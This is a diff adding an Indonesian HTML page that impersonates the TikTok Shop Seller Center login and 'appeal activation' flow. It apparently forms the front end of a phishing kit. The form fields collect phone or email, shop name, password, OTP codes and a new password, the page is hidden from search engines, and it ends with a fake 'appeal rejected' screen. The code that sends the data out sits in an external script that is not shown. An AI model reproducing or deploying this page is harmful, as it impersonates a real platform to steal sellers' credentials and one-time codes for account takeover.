@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <title>TikTok Shop - Aktivasi Banding</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #ffffff;
+            color: #000000;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background: #ffffff;
+            padding: 4vw 5vw;
+            display: none;
+        }
+        .container:first-child { display: block; }
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 5vw;
+        }
+        .back-btn {
+            font-size: clamp(1.8rem, 7vw, 2.2rem);
+            font-weight: 600;
+            cursor: pointer;
+            color: #000;
+        }
+        .icon-info {
+            width: clamp(1.5rem, 6vw, 1.8rem);
+            height: clamp(1.5rem, 6vw, 1.8rem);
+            cursor: pointer;
+        }
+        h1 {
+            font-size: clamp(1.2rem, 4.5vw, 1.5rem);
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 2vw;
+            line-height: 1.4;
+        }
+        h2 {
+            font-size: clamp(1.3rem, 5vw, 1.5rem);
+            font-weight: 700;
+            margin-bottom: 3vw;
+        }
+        .subhead {
+            text-align: center;
+            font-size: clamp(0.9rem, 3.5vw, 1rem);
+            color: #666;
+            margin-bottom: 8vw;
+        }
+        .subhead a {
+            color: #000;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .btn {
+            width: 100%;
+            padding: 3.8vw;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 2vw;
+            transition: all 0.2s;
+            margin-bottom: 3vw;
+        }
+        .btn-tiktok {
+            background: #000000;
+            color: #ffffff;
+            margin-bottom: 6vw;
+        }
+        .btn-tiktok:hover { background: #333333; }
+        .btn-light {
+            background: #f5f5f5;
+            color: #000000;
+            border: 1px solid #e5e5e5;
+        }
+        .btn-light:hover { background: #e8e8e8; }
+        .btn-disabled {
+            background: #e0e0e0;
+            color: #999;
+            cursor: not-allowed;
+        }
+        .btn-icon {
+            width: clamp(1.2rem, 5vw, 1.4rem);
+            height: auto;
+        }
+        .btn-icon-small {
+            width: clamp(1rem, 4vw, 1.2rem);
+            height: auto;
+        }
+        .divider {
+            text-align: center;
+            color: #999;
+            margin: 5vw 0;
+            position: relative;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 35%;
+            height: 1px;
+            background: #e5e5e5;
+        }
+        .divider::before { left: 0; }
+        .divider::after { right: 0; }
+        .desc-text {
+            font-size: clamp(0.85rem, 3.5vw, 0.95rem);
+            color: #666;
+            text-align: center;
+            margin-top: 8vw;
+            line-height: 1.6;
+        }
+        .desc-text a {
+            color: #000;
+            text-decoration: underline;
+        }
+        .tabs {
+            display: flex;
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 0.5vw;
+            margin-bottom: 5vw;
+        }
+        .tab {
+            flex: 1;
+            padding: 2.5vw;
+            text-align: center;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            font-weight: 500;
+            cursor: pointer;
+            color: #666;
+            transition: all 0.2s;
+        }
+        .tab.active {
+            background: #ffffff;
+            color: #000;
+            font-weight: 600;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .input-container { margin-bottom: 3vw; }
+        .input-view { display: none; }
+        .input-view.active { display: block; }
+        .wajib {
+            display: block;
+            font-size: 0.9rem;
+            color: #333;
+            margin-bottom: 1.5vw;
+            font-weight: 500;
+        }
+        .input-row, .input-full, .form-group input, .input-group, .input-prefix {
+            display: flex;
+            align-items: center;
+            border: 1px solid #e5e5e5;
+            border-radius: 10px;
+            overflow: hidden;
+            width: 100%;
+            height: clamp(3rem, 12vw, 3.5rem);
+            background: #ffffff;
+        }
+        .input-row input, .input-full input, .form-group input, .input-group input, .input-prefix input {
+            flex: 1;
+            padding: 0 2vw;
+            border: none;
+            outline: none;
+            font-size: clamp(0.9rem, 3.6vw, 0.95rem);
+            background: transparent;
+            width: 100%;
+            height: 100%;
+        }
+        .country-code {
+            display: flex;
+            align-items: center;
+            padding: 0 2vw;
+            background: #f5f5f5;
+            border-right: 1px solid #e5e5e5;
+            gap: 1vw;
+            height: 100%;
+        }
+        .country-code span {
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+        .country-code select {
+            border: none;
+            background: transparent;
+            font-size: 0.9rem;
+            cursor: pointer;
+        }
+        .form-group { margin-bottom: 4vw; }
+        .form-group label {
+            display: block;
+            font-size: 0.9rem;
+            color: #333;
+            margin-bottom: 1.5vw;
+            font-weight: 500;
+        }
+        .input-group { position: relative; }
+        .input-group input { padding-right: 10vw; }
+        .eye-icon {
+            position: absolute;
+            right: 3vw;
+            width: clamp(1.3rem, 5vw, 1.4rem);
+            height: clamp(1.3rem, 5vw, 1.4rem);
+            cursor: pointer;
+        }
+        .forgot-link {
+            text-align: right;
+            margin-top: 1vw;
+        }
+        .forgot-link a {
+            font-size: 0.9rem;
+            color: #000;
+            text-decoration: none;
+        }
+        .input-prefix .prefix {
+            padding: 0 2vw;
+            background: #f5f5f5;
+            border-right: 1px solid #e5e5e5;
+            font-size: 0.95rem;
+            font-weight: 500;
+            height: 100%;
+            display: flex;
+            align-items: center;
+        }
+        .error-text {
+            color: #d32f2f;
+            font-size: 0.85rem;
+            margin-top: 1vw;
+            display: none;
+        }
+        .otp-desc {
+            text-align: center;
+            color: #666;
+            font-size: 0.95rem;
+            margin-bottom: 5vw;
+        }
+        .otp-input-group {
+            display: flex;
+            justify-content: center;
+            gap: 3vw;
+            margin-bottom: 5vw;
+        }
+        .otp-input-group input {
+            width: clamp(3rem, 12vw, 3.5rem);
+            height: clamp(3rem, 12vw, 3.5rem);
+            text-align: center;
+            font-size: 1.2rem;
+            font-weight: 600;
+            border: 1px solid #e5e5e5;
+            border-radius: 10px;
+            outline: none;
+        }
+        .otp-input-group input:focus { border-color: #000; }
+        .ubah-kode-link {
+            text-align: center;
+            margin-bottom: 6vw;
+        }
+        .ubah-kode-link a {
+            display: inline-block;
+            margin: 0 2vw;
+            color: #000;
+            font-size: 0.9rem;
+            text-decoration: none;
+        }
+        .sms-info {
+            text-align: center;
+            font-size: 0.85rem;
+            color: #2e7d32;
+            margin-bottom: 3vw;
+            padding: 2vw;
+            background: #e8f5e9;
+            border-radius: 8px;
+            display: none;
+        }
+        .result-page {
+            text-align: center;
+            padding-top: 8vw;
+        }
+        .result-icon {
+            font-size: 4rem;
+            margin-bottom: 4vw;
+        }
+        .result-page h2 {
+            font-size: 1.3rem;
+            margin-bottom: 4vw;
+        }
+        .result-desc {
+            font-size: clamp(0.95rem, 4vw, 1.05rem);
+            color: #333;
+            line-height: 1.7;
+            margin-bottom: 8vw;
+            text-align: left;
+            background: #fff3e0;
+            padding: 5vw;
+            border-radius: 10px;
+            border-left: 4px solid #ff9800;
+        }
+        .back-icon-wrap {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: clamp(3.5rem, 14vw, 4rem);
+            height: clamp(3.5rem, 14vw, 4rem);
+            border-radius: 50%;
+            background: #f5f5f5;
+            font-size: clamp(1.8rem, 7vw, 2rem);
+            cursor: pointer;
+            margin-bottom: 2vw;
+        }
+        .back-text {
+            color: #666;
+            font-size: 0.95rem;
+        }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+<!-- HALAMAN UTAMA -->
+<div class="container" id="page1">
+    <div class="header-top">
+        <span class="back-btn" style="visibility: hidden;">&lt;</span>
+        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+    </div>
+    <h1>Aktivasi Pengajuan Banding<br>TikTok Shop Seller Center</h1>
+    <p class="subhead">Toko di Indonesia <a href="#">Ubah</a></p>
+
+    <button class="btn btn-tiktok" onclick="bukaForm('tiktok')">
+        <svg class="btn-icon" viewBox="0 0 24 24" fill="white">
+            <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a3.4 3.4 0 00-.88-.14 4.85 4.85 0 00-3.77 4.24 4.85 4.85 0 003.77 4.24 4.85 4.85 0 003.77-4.24V4.87a4.85 4.85 0 003.77 4.24v3.45a3.74 3.74 0 001.88-.51 3.78 3.78 0 001.53-2.87 3.74 3.74 0 00-1.53-2.87z"/>
+        </svg>
+        Lanjutkan dengan TikTok
+    </button>
+
+    <p class="divider">atau</p>
+
+    <button class="btn btn-light" onclick="bukaForm('masuk')">
+        <img src="https://cdn-icons-png.flaticon.com/512/542/542638.png" alt="Email" class="btn-icon-small">
+        Masuk dengan email/nomor telepon
+    </button>
+
+    <button class="btn btn-light" onclick="goToPage('page2')">
+        <img src="https://cdn-icons-png.flaticon.com/512/3059/3059978.png" alt="Kata Sandi" class="btn-icon-small">
+        Masuk dengan Kata Sandi
+    </button>
+
+    <p class="desc-text">
+        Dengan melanjutkan, Anda menyetujui <a href="#">Ketentuan Layanan</a> dan <a href="#">Kebijakan Privasi</a> TikTok Shop.
+    </p>
+</div>
+
+<!-- HALAMAN FORM -->
+<div class="container" id="page-form">
+    <div class="header-top">
+  
+        <span class="back-btn" onclick="kembaliKeSebelumnya()">&lt;</span>
+
+
+        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+    </div>
+    <h2 id="form-judul">Masuk</h2>
+    <p class="otp-desc" id="form-desc">Masukkan data akun Anda</p>
+
+    <div class="tabs">
+        <div class="tab active" data-tab="hp">Nomor HP</div>
+        <div class="tab" data-tab="email">Email</div>
+    </div>
+
+    <div class="input-container">
+        <div class="input-view active" id="form-view-hp">
+            <label class="wajib">Nomor Telepon</label>
+            <div class="input-row">
+                <div class="country-code">
+                    <span>+62</span>
+
+                </div>
+                <input type="tel" id="form-hp" placeholder="Masukkan nomor HP" oninput="cekValidasiForm()">
+            </div>
+        </div>
+        <div class="input-view" id="form-view-email">
+            <label class="wajib">Email</label>
+            <div class="input-full">
+                <input type="email" id="form-email" placeholder="Masukkan alamat email" oninput="cekValidasiForm()">
+            </div>
+        </div>
+    </div>
+
+     <!-- ✅ INPUT NAMA TOKO UKURAN SAMA PERSIS -->
+    <div class="input-container">
+        <label class="wajib">Nama Toko Seller Center</label>
+        <div class="input-full">
+            <input type="text" id="nama-toko" placeholder="Masukkan nama toko Anda" oninput="cekValidasiLogin()">
+        </div>
+    </div>
+
+
+    <p class="error-text" id="form-kontak-error">Masukkan nomor diawali angka 8 atau email yang valid</p>
+    <button class="btn btn-disabled" id="form-btn" disabled onclick="lanjutKeOTP('form')">Lanjutkan</button>
+</div>
+
+<!-- HALAMAN MASUK DENGAN SANDI -->
+<div class="container" id="page2">
+    <div class="header-top">
+        <span class="back-btn" onclick="kembaliKeSebelumnya()">&lt;</span>
+        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+    </div>
+    <h2>Masuk</h2>
+
+    <div class="tabs">
+        <div class="tab active" data-tab="hp">Nomor HP</div>
+        <div class="tab" data-tab="email">Email</div>
+    </div>
+
+    <div class="input-container">
+        <div class="input-view active" id="view-hp">
+            <label class="wajib">Nomor Telepon</label>
+            <div class="input-row">
+                <div class="country-code">
+                    <span>+62</span>
+
+                </div>
+                <input type="tel" id="login-hp" placeholder="8xx-xxxx-xxxx" oninput="cekValidasiLogin()">
+            </div>
+        </div>
+        <div class="input-view" id="view-email">
+            <label class="wajib">Email</label>
+            <div class="input-full">
+                <input type="email" id="login-email" placeholder="Masukkan alamat email" oninput="cekValidasiLogin()">
+            </div>
+        </div>
+    </div>
+
+       <!-- ✅ INPUT NAMA TOKO UKURAN SAMA PERSIS -->
+    <div class="input-container">
+        <label class="wajib">Nama Toko Seller Center</label>
+        <div class="input-full">
+            <input type="text" id="nama-toko" placeholder="Masukkan nama toko Anda" oninput="cekValidasiLogin()">
+        </div>
+    </div>
+
+    <div class="form-group">
+        <label class="wajib">Kata Sandi</label>
+        <div class="input-group">
+            <input type="password" id="pass-login" placeholder="Masukkan kata sandi" oninput="cekValidasiLogin()">
+            <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat Sandi" class="eye-icon" id="eye-login" onclick="togglePassword('pass-login', 'eye-login')">
+        </div>
+        <div class="forgot-link">
+            <a href="#" onclick="goToPage('page3')">Lupa Kata Sandi</a>
+        </div>
+    </div>
+    <p class="error-text" id="login-error">Masukkan nomor (diawali angka 8) atau email yang valid</p>
+    <button class="btn btn-disabled" id="btn-login" disabled onclick="lanjutKeOTP('login')">Lanjutkan</button>
+</div>
+
+<!-- HALAMAN OTP -->
+<div class="container" id="page-otp">
+    <div class="header-top">
+        <span class="back-btn" onclick="kembaliDariOTP()">&lt;</span>
+
+        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+    </div>
+    <h2 style="text-align: center;">Masukkan Kode OTP</h2>
+    <p class="otp-desc" id="otp-keterangan">Kode dikirim ke nomor atau email Anda</p>
+    <div class="sms-info" id="sms-pesan">✅ SMS diterima, kode otomatis terisi!</div>
+    <div class="otp-input-group" id="otp-kotak"></div>
+    <div class="ubah-kode-link" id="link-ubah-kode">
+        <a href="#" onclick="ubahKodeOTP()">Ubah nomor/email</a>
+        <a href="#" id="link-ganti-otp" onclick="gantiJumlahOTP()">Ganti kode 6 angka</a>
+    </div>
+    <button class="btn btn-disabled" id="otp-btn" disabled onclick="kirimOTP()">Verifikasi</button>
+</div>
+
+<!-- HALAMAN HASIL -->
+<div class="container" id="page-result">
+    <div class="result-page">
+        <div class="result-icon">⚠️</div>
+        <h2>Pengajuan Banding Ditolak</h2>
+        <p class="result-desc">
+            Keranjang Kuning Anda belum terhubung.<br><br>
+            Hubungkan TikTok Seller Center ke Tokopedia terlebih dahulu.<br><br>
+            Silakan Buka Aplikasi Seller Center Untuk Menghubungkan TikTok Shop ke Tokopedia
+        </p>
+        <div class="back-icon-wrap" onclick="KembalikeHalamanSebelumnya()">&larr;</div>
+        <p class="back-text">Kembali ke halaman awal</p>
+    </div>
+</div>
+
+<!-- HALAMAN LUPA SANDI -->
+<div class="container" id="page3">
+    <div class="header-top">
+        <span class="back-btn" onclick="kembaliKeHalamanSebelumnya()">&lt;</span>
+        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+    </div>
+    <h2>Reset Kata Sandi</h2>
+    <p class="otp-desc">Kata sandi akan diperbarui juga di TikTok for Business</p>
+    <div class="tabs">
+        <div class="tab active" data-tab="hp">Nomor HP</div>
+        <div class="tab" data-tab="email">Email</div>
+    </div>
+    
+    <div id="tab-hp">
+        <div class="form-group">
+            <label class="wajib">Nomor HP</label>
+            <div class="input-prefix">
+                <span class="prefix">+62</span>
+                <input type="tel" id="reset-hp" placeholder="8xx-xxxx-xxxx" oninput="cekValidasiReset()">
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="wajib">Kata Sandi Baru</label>
+            <div class="input-group">
+                <input type="password" id="pass-baru-hp" placeholder="Minimal 6 karakter" oninput="cekValidasiReset()">
+                <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat" class="eye-icon" onclick="togglePass('pass-baru-hp', this)">
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="wajib">Konfirmasi Sandi</label>
+            <div class="input-group">
+                <input type="password" id="pass-konfirm-hp" placeholder="Ulangi sandi baru" oninput="cekValidasiReset()">
+                <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat" class="eye-icon" onclick="togglePass('pass-konfirm-hp', this)">
+            </div>
+        </div>
+    </div>
+    
+    <div id="tab-email" style="display: none;">
+        <div class="form-group">
+            <label class="wajib">Email</label>
+            <div class="input-full">
+                <input type="email" id="reset-email" placeholder="email@contoh.com" oninput="cekValidasiReset()">
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="wajib">Kata Sandi Baru</label>
+            <div class="input-group">
+                <input type="password" id="pass-baru-email" placeholder="Minimal 6 karakter" oninput="cekValidasiReset()">
+                <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat" class="eye-icon" onclick="togglePass('pass-baru-email', this)">
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="wajib">Konfirmasi Sandi</label>
+            <div class="input-group">
+                <input type="password" id="pass-konfirm-email" placeholder="Ulangi sandi baru" oninput="cekValidasiReset()">
+                <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat" class="eye-icon" onclick="togglePass('pass-konfirm-email', this)">
+            </div>
+        </div>
+    </div>
+    
+    <button class="btn btn-disabled" id="btn-reset" disabled onclick="lanjutKeOTP('reset')">Kirim Kode</button>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
